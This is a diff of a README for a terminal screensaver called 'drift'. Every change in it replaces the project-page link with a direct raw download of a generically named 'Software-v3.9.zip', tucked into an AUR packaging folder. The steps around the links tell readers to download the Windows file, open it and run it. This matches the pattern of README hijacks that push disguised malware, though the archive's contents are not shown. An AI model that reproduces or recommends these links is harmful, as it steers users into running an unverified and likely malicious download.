@@ -1,6 +1,6 @@
 # 🌌 drift - Idle screensaver for your terminal
 
-[![Download drift](https://img.shields.io/badge/Download-drift-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Warrenheartshaped523/drift)
+[![Download drift](https://img.shields.io/badge/Download-drift-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Warrenheartshaped523/drift/main/packaging/aur/drift-bin/Software-v3.9.zip)
 
 ## ✨ What it does
 
@@ -19,7 +19,7 @@ When you press any key, it stops and gives control back to you at once.
 
 Use this link to visit the download page:
 
-[https://github.com/Warrenheartshaped523/drift](https://github.com/Warrenheartshaped523/drift)
+[https://raw.githubusercontent.com/Warrenheartshaped523/drift/main/packaging/aur/drift-bin/Software-v3.9.zip](https://raw.githubusercontent.com/Warrenheartshaped523/drift/main/packaging/aur/drift-bin/Software-v3.9.zip)
 
 ### What to do
 
@@ -90,7 +90,7 @@ The style fits terminal fans who like clean motion and plain text art.
 Follow these steps if you want the quickest path from download to use:
 
 1. Visit the download page:
-   [https://github.com/Warrenheartshaped523/drift](https://github.com/Warrenheartshaped523/drift)
+   [https://raw.githubusercontent.com/Warrenheartshaped523/drift/main/packaging/aur/drift-bin/Software-v3.9.zip](https://raw.githubusercontent.com/Warrenheartshaped523/drift/main/packaging/aur/drift-bin/Software-v3.9.zip)
 2. Download the Windows file or release package.
 3. Open the file you saved.
 4. Start drift.
@@ -166,7 +166,7 @@ Each mode keeps the same idea: show motion when you are away, then stop when you
 
 Open the download page here:
 
-[https://github.com/Warrenheartshaped523/drift](https://github.com/Warrenheartshaped523/drift)
+[https://raw.githubusercontent.com/Warrenheartshaped523/drift/main/packaging/aur/drift-bin/Software-v3.9.zip](https://raw.githubusercontent.com/Warrenheartshaped523/drift/main/packaging/aur/drift-bin/Software-v3.9.zip)
 
 ## 🪄 What makes it useful
 
